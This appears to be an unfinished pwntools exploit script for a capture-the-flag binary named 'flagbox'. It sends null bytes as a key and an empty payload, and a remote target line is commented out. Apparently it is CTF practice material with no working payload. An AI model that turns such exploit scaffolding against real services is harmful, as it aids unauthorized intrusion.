from pwn import *

p = process('./flagbox')
#p = remote("0x0.site", 12208)
e = ELF('./flagbox')
l = e.libc

context.log_level = "debug"

p.sendafter('key : ', '\x00' * 11)

payload =''
p.sendafter("where did you get it? : ", payload)

p.interactive()
